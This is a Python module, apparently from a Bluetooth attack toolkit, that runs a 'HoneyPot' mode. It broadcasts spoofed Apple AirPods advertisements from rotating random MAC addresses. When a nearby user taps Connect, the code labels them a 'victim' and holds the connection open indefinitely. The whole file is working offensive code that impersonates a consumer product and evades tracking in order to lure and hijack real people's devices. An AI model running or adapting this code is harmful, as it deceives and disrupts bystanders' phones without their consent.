import time
import struct
import random
import socket
import select
from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev, ADV_IND, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE
import bluetooth._bluetooth as bluez
from rich.panel import Panel

class HoneyPotModule:
    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_honeypot(self):
        self.log(f"[bold red][*] Starting HoneyPot Mode on hci{self.dev_id}...[/bold red]")
        
        self.sock = open_dev(self.dev_id)
        if not self.sock:
             self.log("[red][!] Failed to open HCI device.[/red]")
             return
        
        # Set filter to receive events - Manual construction to bypass PyBluez Unicode bug
        old_filter = self.sock.getsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, 14)
        
        # struct hci_filter { uint32_t type_mask; uint32_t event_mask[2]; uint16_t opcode; };
        type_mask = 1 << bluez.HCI_EVENT_PKT
        event_mask1 = 0xFFFFFFFF
        event_mask2 = 0xFFFFFFFF
        opcode = 0
        
        flt = struct.pack("<IIIH", type_mask, event_mask1, event_mask2, opcode)
        
        try:
            self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, flt)
        except Exception as e:
            self.log(f"[yellow][!] Filter set failed with {e}. Trying with padding (16 bytes)...[/yellow]")
            # Some kernels/archs require 16-byte alignment (2 bytes padding at end)
            flt_padded = flt + b'\0\0'
            try:
                self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, flt_padded)
            except Exception as e2:
                self.log(f"[red][!] Failed to set HCI filter: {e2}[/red]")
                return

        self.log("[green][*] Broadcasting Connectable Signal (HoneyPot Active)...[/green]")
        self.log("[dim][*] Waiting for victims to press 'Connect'...[/dim]")

        try:
            while True:
                # 1. Generate Random Static Address (Top 2 bits must be 11 for Random Static)
                # Actually, standard allows random static to start with 0xC0 (11000000)
                # Let's generate a random 6-byte address but ensure top bits are set for Static Random
                
                rand_mac = [
                    0xC0 | (random.randint(0, 3) << 4) | random.randint(0, 15), # 0xC0 to 0xFF essentially, ensuring high bits
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                ]
                
                # Convert to reversed bytes for HCI command
                rand_mac_bytes = bytes(reversed(rand_mac))
                rand_mac_str = ':'.join('%02x' % x for x in rand_mac)
                
                self.log(f"[dim][*] Rotating MAC Address to: {rand_mac_str}...[/dim]")

                # 2. Set Random Address in Controller
                from core.hci_wrapper import set_random_le_address
                try:
                    set_random_le_address(self.sock, rand_mac_bytes)
                except Exception as e:
                    self.log(f"[yellow][!] Failed to set random address: {e}[/yellow]")

                # 3. Start Advertising with Random Address Type (0x01)
                # Standard AirPod Spoof Packet
                prefix = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
                suffix = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
                
                # Randomize payload parts slightly too
                left = (random.randint(1, 100),)
                right = (random.randint(1, 100),)
                case = (random.randint(128, 228),)
                packet_data = prefix + left + right + case + suffix

                start_le_advertising(self.sock, min_interval=200, max_interval=200, adv_type=ADV_IND, data=packet_data, own_bdaddr_type=0x01)
                
                # 4. Wait for Connection Event
                # Advertises for max 15 seconds then rotates if no one connects
                start_time = time.time()
                connected = False
                
                while (time.time() - start_time) < 15:
                    readable, _, _ = select.select([self.sock], [], [], 0.5) 
                    if self.sock in readable:
                        pkt = self.sock.recv(255)
                        event_code = pkt[1]
                        
                        # EVT_LE_CONN_COMPLETE
                        if event_code == 0x3E and pkt[3] == 0x01:
                            status = pkt[4]
                            handle = struct.unpack("<H", pkt[5:7])[0]
                            peer_bdaddr = pkt[9:15]
                            mac_str = ':'.join('%02x' % b for b in reversed(peer_bdaddr))
                            
                            if status == 0x00: # Success
                                victim_msg = f"[bold red]VICTIM CONNECTED![/bold red]\nMAC: [yellow]{mac_str}[/yellow]\nHandle: {handle}\n[bold green] STATUS: LOCKED ON [/bold green]"
                                if self.console:
                                    self.console.print(Panel(victim_msg, title="HoneyPot Alert", border_style="red"))
                                else:
                                    print(f"\n[!] VICTIM CONNECTED: {mac_str} (LOCKED)")
                                
                                # LOCK ON: Stop advertising and just hold the connection
                                stop_le_advertising(self.sock)
                                connected = True
                                
                                self.log(f"[bold red][*] Holding Connection with {mac_str} (Ctrl+C to stop)...[/bold red]")
                                
                                # Infinite hold loop (until disconnect or kill)
                                try:
                                    while True:
                                        # Keep reading socket to drain queue and maybe detect disconnect
                                        readable, _, _ = select.select([self.sock], [], [], 1)
                                        if self.sock in readable:
                                            pkt = self.sock.recv(255)
                                            # TODO: Handle Disconnect Event (0x05) if we enable those events
                                            # For now, just hold.
                                except KeyboardInterrupt:
                                    raise # Propagate up to main handler which cleans up
                                
                                # This break is unreachable currently unless we add disconnect logic,
                                # ensuring we stay locked.
                                break 
                    
                # 5. Cleanup before next loop iteration (Only runs if NOT connected/locked)
                if not connected:
                    stop_le_advertising(self.sock)
                    pass # Just rotate loop
                    
        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping HoneyPot...[/yellow]")
            stop_le_advertising(self.sock)
            
            try:
                self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, old_filter)
            except Exception:
                # Retry with padding if restoration fails
                try:
                    self.sock.setsockopt(bluez.SOL_HCI, bluez.HCI_FILTER, old_filter + b'\0\0')
                except Exception as e:
                    self.log(f"[red][!] Failed to restore HCI filter: {e}[/red]")
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")
